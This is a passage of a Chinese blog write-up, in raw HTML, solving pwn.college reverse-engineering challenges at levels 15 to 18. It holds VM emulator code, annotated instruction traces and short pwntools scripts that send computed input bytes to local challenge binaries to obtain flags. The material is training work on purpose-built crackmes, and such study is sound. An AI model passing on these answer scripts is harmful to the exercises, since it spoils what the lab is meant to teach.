class="hljs-params">a2</span>):<br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">256</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">257</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">258</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">259</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">260</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">261</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">262</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1507</span>(<span class="hljs-params">a2, a3</span>):<br>    res = a2<br>    a1[a2] = a3<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1568</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = sub_1363(a2)<br>    v4 = sub_1363(a3)<br>    <span class="hljs-keyword">return</span> sub_1415(a2, v3+v4)<br><br><br><span class="hljs-comment"># sub_1533(16, 82)</span><br><span class="hljs-comment"># sub_1533(2, 8)</span><br><span class="hljs-comment"># sub_1533(8, 0)</span><br><span class="hljs-comment"># sub_1896(8, 8)</span><br>sub_1533(<span class="hljs-number">16</span>, <span class="hljs-number">114</span>)<br>sub_1533(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">97</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">170</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">239</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">133</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">167</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">205</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">70</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br>sub_1533(<span class="hljs-number">8</span>, <span class="hljs-number">226</span>)<br>sub_1687(<span class="hljs-number">16</span>, <span class="hljs-number">8</span>)<br>sub_1568(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    <span class="hljs-built_in">print</span>(a1[<span class="hljs-number">114</span>+i])<br></code></pre></td></tr></table></figure>

<p>这里能够注释掉前面几个混淆，因为没起作用。后面的<code>sub_18969()</code>是获取用户输入的。所以不需要写。</p>
<p>最后exp就不贴了，模板还是之前的，然后改一改数字就行了。</p>
<h4 id="level15-0"><a href="#level15-0" class="headerlink" title="level15.0"></a>level15.0</h4><p>道理是一样的，不过这一关的open flag啥的也被做成了函数，也就是后面的<code>if()</code>语句内的。我们只需要关注<code>memcmp()</code>函数以前的vmcode即可。</p>
<h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15.1"></a>level15.1</h4><p>还是之前的脚本，跑一下，打印出来的整数转成字节序，发给目标程序即可拿到flag。</p>
<h4 id="level16-0"><a href="#level16-0" class="headerlink" title="level16.0"></a>level16.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x5c</span>, <span class="hljs-number">0</span>x99, <span class="hljs-number">0</span>xc6, <span class="hljs-number">0</span>x21, <span class="hljs-number">0</span>xce, <span class="hljs-number">0</span>xf2, <span class="hljs-number">0</span>x7e, <span class="hljs-number">0</span>xb8<br></code></pre></td></tr></table></figure>

<p>依然不用管后续的cmp就行了。其实就是刚开始的cmp换了种形式。依然可以直接按照先前的方法。记住ida pro这种形式，其实也是一种字符串的匹配问题。</p>
<h4 id="level16-1"><a href="#level16-1" class="headerlink" title="level16.1"></a>level16.1</h4><p>这一关就记住，找到输入的位置。根据之前的规律，很简单就知道用户从a1的哪个索引处开始写入数据的：</p>
<img src="/2025/03/01/pwn-college-题解/image-20250306162439521.png" srcset="/img/loading.gif" lazyload  alt="image-20250306162439521" style="zoom:50%;" />

<p>因此，我们只需要用之前的脚本执行一下就行。（可能有名字的差异，但是大差不差。简单找一找就能知道对应的函数了）</p>
<h4 id="level17-0"><a href="#level17-0" class="headerlink" title="level17.0"></a>level17.0</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs armasm">[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x51</span><br>[s] IMM c = <span class="hljs-number">0x1</span><br>[s] IMM a = <span class="hljs-number">0x87</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-built_in">a1</span>[<span class="hljs-number">81</span>] = <span class="hljs-number">0x87</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xf</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-built_in">a1</span>[<span class="hljs-number">82</span>] = <span class="hljs-number">0xf</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xca</span>			<br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-number">83</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xc1</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-number">84</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xde</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-number">85</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0x29</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-number">86</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x31</span><br>[s] IMM c = <span class="hljs-number">0x1</span><br>[s] <span class="hljs-keyword">LDM</span> a = *<span class="hljs-keyword">b</span>				# a = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x31</span>]<br>[s] IMM d = <span class="hljs-number">0xc0</span>			# d = <span class="hljs-number">0xc0</span><br>[s] <span class="hljs-keyword">ADD</span> a d					# a = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x31</span>] + <span class="hljs-number">0xc0</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a				# <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x31</span>] = <span class="hljs-number">0xc0</span><br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c					# <span class="hljs-keyword">b</span> = <span class="hljs-number">0x31</span> + <span class="hljs-number">0x32</span><br>[s] <span class="hljs-keyword">LDM</span> a = *<span class="hljs-keyword">b</span>				# a = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x32</span>]<br>[s] IMM d = <span class="hljs-number">0</span>				<br>[s] <span class="hljs-keyword">ADD</span> a d					# a = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x32</span>] + <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p>可以发现，多了<code>LDM</code>指令。经过分析之后，发现它是会对我们的输入进行了一个加法的操作。所以，我们把它打印出来，然后做减法就行了。注意转换成字节序的时候，有符号和范围溢出的问题。我们可以分开处理正数和负数就行了。exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">from pwn import *<br><br>p = process(&#x27;/challenge/babyrev-level-17-0&#x27;)<br>al = [-57, 15, 178, 162,180,-100]<br>payload = b&#x27;&#x27;<br>for i in range(len(al)):<br>    if al[i] &gt; 0:<br>        payload += struct.pack(&#x27;B&#x27;, al[i])<br>    else:<br>        payload += struct.pack(&#x27;b&#x27;, al[i])<br># payload = struct.pack(&#x27;6b&#x27;, *al)<br>print(payload)<br>p.send(payload)<br>print(p.readall())<br></code></pre></td></tr></table></figure>



<h4 id="level17-1"><a href="#level17-1" class="headerlink" title="level17.1"></a>level17.1</h4><p>这里记录一下题目中的api，方便我们拿到匹配的字符串。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a1 = np.zeros((<span class="hljs-number">512</span>,<span class="hljs-number">1</span>), dtype=<span class="hljs-built_in">int</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">imm</span>(<span class="hljs-params">a2,a3</span>):<br>    <span class="hljs-keyword">return</span> sub_1415(a2,a3)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stm</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = read_register(a3)<br>    v4 = read_register(a2)<br>    <span class="hljs-keyword">return</span> write_memory(v4, v3)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_memory</span>(<span class="hljs-params">a2, a3</span>):<br>    res = a2<br>    a1[a2] = a3<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = sub_1363(a2)<br>    v4 = sub_1363(a3)<br>    <span class="hljs-keyword">return</span> sub_1415(a2, v3+v4)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_register</span>(<span class="hljs-params">a2</span>):<br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">257</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">256</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">261</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">259</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">260</span>]<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> a1[<span class="hljs-number">258</span>]<br>    <span class="hljs-keyword">return</span> a1[<span class="hljs-number">262</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_register</span>(<span class="hljs-params">a2, a3</span>):             <span class="hljs-comment"># sub_13F5</span><br>    <span class="hljs-keyword">match</span> a2:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            a1[<span class="hljs-number">257</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            a1[<span class="hljs-number">256</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            a1[<span class="hljs-number">262</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            a1[<span class="hljs-number">261</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            a1[<span class="hljs-number">259</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            a1[<span class="hljs-number">260</span>] = a3<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            a1[<span class="hljs-number">258</span>] = a3<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ldm</span>(<span class="hljs-params">a2, a3</span>):<br>    v5 = read_register(a3)<br>    memory = read_memory(v5)<br>    <span class="hljs-keyword">return</span> write_register(a2, memory)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_memory</span>(<span class="hljs-params">a2</span>):<br>    <span class="hljs-keyword">return</span> a1[a2]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">imm</span>(<span class="hljs-params">a2, a3</span>):<br>    <span class="hljs-keyword">return</span> write_register(a2, a3)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_memory</span>(<span class="hljs-params">a2, a3</span>):<br>    a1[a2] = a3<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stm</span>(<span class="hljs-params">a2, a3</span>):                    <span class="hljs-comment"># stm</span><br>    v3 = read_register(a3)          <span class="hljs-comment"># </span><br>    v5 = read_register(a2)          <span class="hljs-comment"># </span><br>    <span class="hljs-keyword">return</span> write_memory(v5, v3)     <span class="hljs-comment"># </span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a2, a3</span>):<br>    v3 = read_register(a2)<br>    v5 = read_register(a3)<br>    <span class="hljs-keyword">return</span> write_register(a2, v3+v5)<br><br></code></pre></td></tr></table></figure>

<p>ida打开，同样的有<code>LDM</code>指令，不过符号没有标识出来而已。然后发现它是在它原先的字符串上进行了加法，而不是上一题那样在我们输入的字符串上进行加法。那就很简单了。只需要把最后的值打印出来，然后大于256的减一下就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyrev-level-17-1&#x27;</span>)<br>al = [<span class="hljs-number">188</span>, <span class="hljs-number">371</span>, <span class="hljs-number">259</span>, <span class="hljs-number">201</span>,<span class="hljs-number">273</span>,<span class="hljs-number">381</span>, <span class="hljs-number">204</span>, <span class="hljs-number">259</span>,<span class="hljs-number">313</span>, <span class="hljs-number">219</span>, <span class="hljs-number">235</span>,<span class="hljs-number">411</span>]<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(al)):<br>    <span class="hljs-keyword">if</span> al[i] &gt; <span class="hljs-number">256</span>:<br>        payload += struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, al[i] - <span class="hljs-number">256</span>)<br>    <span class="hljs-keyword">else</span>:<br>        payload += struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, al[i])<br><span class="hljs-comment"># payload = struct.pack(&#x27;6b&#x27;, *al)</span><br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.readall())<br><br></code></pre></td></tr></table></figure>



<h4 id="level18-0"><a href="#level18-0" class="headerlink" title="level18.0"></a>level18.0</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs armasm">[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x6d</span><br>[s] IMM c = <span class="hljs-number">0x1</span><br>[s] IMM a = <span class="hljs-number">0x81</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a						<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xea</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0x34</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xde</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xf2</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0x1d</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xe</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0x49</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM a = <span class="hljs-number">0xe1</span><br>[s] <span class="hljs-keyword">STM</span> *<span class="hljs-keyword">b</span> = a<br>[s] <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">b</span> c<br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x6d</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span>					# <span class="hljs-keyword">b</span> = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x6d</span>] = <span class="hljs-number">0x81</span><br>[s] IMM a = <span class="hljs-number">0x4d</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a					# a = <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x4d</span>]	users input from <span class="hljs-number">0x4d</span><br>[s] IMM c = <span class="hljs-number">0x2e</span><br>[s] <span class="hljs-keyword">ADD</span> a c						# a = <span class="hljs-number">0x2e</span><br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span>						# <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x6d</span>], <span class="hljs-built_in">a1</span>[<span class="hljs-number">0x4d</span>] + <span class="hljs-number">0x2e</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x6e</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x4e</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0xa7</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x6f</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x4f</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0x9e</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x70</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x50</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0x82</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x71</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x51</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0x9d</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x72</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x52</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0x89</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x73</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x53</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0xdc</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x74</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x54</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0x7</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a <span class="hljs-keyword">b</span><br>[s] IMM <span class="hljs-keyword">b</span> = <span class="hljs-number">0x75</span><br>[s] <span class="hljs-keyword">LDM</span> <span class="hljs-keyword">b</span> = *<span class="hljs-keyword">b</span><br>[s] IMM a = <span class="hljs-number">0x55</span><br>[s] <span class="hljs-keyword">LDM</span> a = *a<br>[s] IMM c = <span class="hljs-number">0xa9</span><br>[s] <span class="hljs-keyword">ADD</span> a c<br>[s] <span class="hljs-keyword">CMP</span> a b<br></code></pre></td></tr></table></figure>

<p>其他的不怎么用改，只不过在这里需要自己加变量，然后打印出来中间的输入。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 